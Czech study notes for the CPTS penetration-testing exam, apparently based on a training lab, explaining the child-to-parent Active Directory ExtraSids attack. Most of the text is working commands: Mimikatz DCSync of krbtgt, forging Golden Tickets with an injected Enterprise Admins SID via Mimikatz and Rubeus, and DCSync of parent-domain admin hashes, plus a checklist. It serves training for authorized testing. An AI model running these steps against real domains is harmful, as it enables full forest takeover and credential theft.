# 📖 CPTS: Útoky na doménové vztahy (Trusts) – Child ➔ Parent (Windows)

Při kompromitaci dětské domény (Child Domain) v rámci jednoho lesa (Active Directory Forest) je téměř vždy možné zcela ovládnout i rodičovskou doménu (Parent/Root Domain). Tento útok zneužívá absenci ochrany **SID Filtering** uvnitř jednoho AD lesa a mechanismus zvaný **SID History**.

## 🔍 Teoretický základ a fungování

### Co je SID History?

Atribut `sidHistory` slouží k usnadnění migrace uživatelů a skupin mezi doménami. Pokud se účet přesune z domény A do domény B, vytvoří se v doméně B nový účet s novým SID. Původní SID se však zapíše do jeho `sidHistory`. Při přihlášení uživatele se všechna SID zapsaná v jeho `sidHistory` přidají do jeho bezpečnostního tokenu. Systém pak uživateli povolí přístup ke zdrojům na základě všech těchto SID.

### Jak funguje útok ExtraSids?

1. **Absence SID Filtering:** Mezi doménami v rámci jednoho AD lesa (Forest) se ve výchozím nastavení neprovádí filtrace SID (SID Filtering je aktivní pouze při přechodu hranic lesa – Forest Trust). Rodičovská doména plně důvěřuje bezpečnostním tokenům vystaveným dětskou doménou.
    
2. **Injekce SID (SID History Injection):** Pokud má útočník plnou kontrolu nad dětskou doménou (např. z pozice Domain Admin), může vygenerovat Kerberos lístek (Golden Ticket) a do pole `ExtraSids` (které reprezentuje `sidHistory`) vložit SID vysoce privilegované skupiny z rodičovské domény.
    
3. **Enterprise Admins cíl:** Nejčastějším cílem je skupina **Enterprise Admins** (která existuje pouze v kořenové/rodičovské doméně a končí RID `519`).
    
4. **Výsledek:** Jakmile se útočník prokáže tímto lístkem v rodičovské doméně, řadič domény (DC) přečte pole `ExtraSids`, uvidí SID skupiny `Enterprise Admins` a přidá jej do bezpečnostního tokenu. Útočník získává plný administrativní přístup k celému AD lesu.
    

### 💥 Dopad útoku (Impact)

- **Kritický (Forest Compromise):** Úplné a okamžité ovládnutí rodičovské domény a všech ostatních přidružených domén v rámci lesa. Možnost provádět DCSync na kterémkoli doménovém řadiči v síti.
    

## 🛠️ Postup útoku krok za krokem

Pro úspěšné provedení útoku **ExtraSids** z kompromitované dětské domény potřebujeme shromáždit 5 klíčových údajů:

1. **KRBTGT hash** dětské domény.
    
2. **SID** dětské domény.
    
3. **Cílové uživatelské jméno** (může být zcela fiktivní, např. `hacker`).
    
4. **FQDN** dětské domény.
    
5. **SID skupiny Enterprise Admins** z rodičovské domény.
    

### Krok 1: Získání KRBTGT hashe dětské domény

Spusťte Mimikatz na kompromitovaném stroji v dětské doméně pod právy Domain Admin a proveďte DCSync pro účet `krbtgt`:

```
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

- **Získaný hash (NTLM):** `9d765b482771505cbe97411065964d5f`
    

### Krok 2: Získání SID dětské domény

Tento údaj je vidět přímo ve výstupu DCSync výše (Object Security ID bez RID `-502`), nebo jej lze vyhledat přes PowerView:

```
Get-DomainSID
```

- **Získané SID:** `S-1-5-21-2806153819-209893948-922872689`
    

### Krok 3: Získání SID Enterprise Admins z rodičovské domény

Dotážeme se rodičovské domény na SID skupiny `Enterprise Admins` (lze provést přes LDAP dotaz z dětské domény):

- **Pomocí PowerView:**
    
    ```
    Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
    ```
    
- **Pomocí vestavěného modulu Active Directory:**
    
    ```
    Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
    ```
    
- **Získané SID EA:** `S-1-5-21-3842939050-3880317879-2865463114-519`
    

## 🚀 Provedení útoku (Injekce lístku)

### Metoda A: Pomocí nástroje Mimikatz (`kerberos::golden`)

Tento příkaz vygeneruje falešný Golden Ticket pro uživatele `hacker` a rovnou ho injektuje do paměti aktuální relace (`/ptt`):

```
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

### Metoda B: Pomocí nástroje Rubeus (`golden`)

Stejný útok lze provést modernějším způsobem přes Rubeus. Parametr `/rc4` reprezentuje NTLM hash účtu `krbtgt`:

```
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

## 🎯 Ověření přístupu a exfiltrace (DCSync)

Po úspěšném zavedení lístku do paměti ověříme přístup k rodičovskému doménovému řadiči.

### 1. Ověření Kerberos lístků v paměti

```
klist
```

_Měli byste vidět platný tiket pro fiktivního uživatele `hacker @ LOGISTICS.INLANEFREIGHT.LOCAL`._

### 2. Test přístupu na C$ sdílení rodičovského DC

Před útokem byl přístup odepřen (`Access is denied`), nyní by měl příkaz úspěšně vypsat obsah disku:

```
ls \\academy-ea-dc01.inlanefreight.local\c$
```

### 3. DCSync útoku na rodičovskou doménu

Díky právům `Enterprise Admins` můžeme zneužít replikační práva a vyžádat si hash libovolného uživatele (např. rodičovského Domain Admina `lab_adm`) přímo z rodičovského DC:

```
# Pokud cílíte na jinou doménu, musíte explicitně uvést parametr /domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

# 📋 CPTS Checklist: Child ➔ Parent Trust (ExtraSids)

Následující checklist použijte během praktické části zkoušky CPTS při postupu z dětské domény směrem nahoru.

### 🔲 Fáze 1: Sběr informací (child domain)

- [ ] **Získat NTLM hash krbtgt:** Provést DCSync v dětské doméně (`lsadump::dcsync /user:LOGISTICS\krbtgt`).
    
- [ ] **Zjistit SID dětské domény:** Zapsat si SID z výstupu DCSync nebo použít `Get-DomainSID`.
    
- [ ] **Zjistit FQDN:** Zapsat si plný název dětské domény (např. `LOGISTICS.INLANEFREIGHT.LOCAL`).
    

### 🔲 Fáze 2: Sběr informací (Rodičovská doména)

- [ ] **Zjistit SID Enterprise Admins:** Vyhledat SID skupiny Enterprise Admins v rodičovské doméně.
    
    - _Rychlý tip:_ SID kořenové domény + RID `519` (např. `S-1-5-21-3842939050-3880317879-2865463114-519`).
        

### 🔲 Fáze 3: Provedení a validace

- [ ] **Ověřit výchozí stav:** Spustit `ls \\<Parent_DC>\c$` a ujistit se, že přístup je odepřen (potvrzení výchozího stavu pro report).
    
- [ ] **Generovat a injektovat tiket:**
    
    - **Mimikatz:** `kerberos::golden /user:hacker /domain:<Child_FQDN> /sid:<Child_SID> /krbtgt:<krbtgt_Hash> /sids:<EA_SID> /ptt`
        
    - **Rubeus:** `Rubeus.exe golden /rc4:<krbtgt_Hash> /domain:<Child_FQDN> /sid:<Child_SID> /sids:<EA_SID> /user:hacker /ptt`
        
- [ ] **Ověřit přítomnost tiketu:** Spustit `klist` a zkontrolovat přítomnost tiketu.
    
- [ ] **Ověřit zvýšený přístup:** Spustit `ls \\<Parent_DC>\c$` (příkaz musí projít).
    

### 🔲 Fáze 4: Ovládnutí lesa (Persistence)

- [ ] **DCSync rodičovského Admina:** Provést DCSync pro administrátorský účet v rodičovské doméně (`lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL`).
    
- [ ] **DCSync rodičovského krbtgt:** Získat hash rodičovského `krbtgt` pro možnost tvorby Golden Ticketu přímo v rodičovské doméně.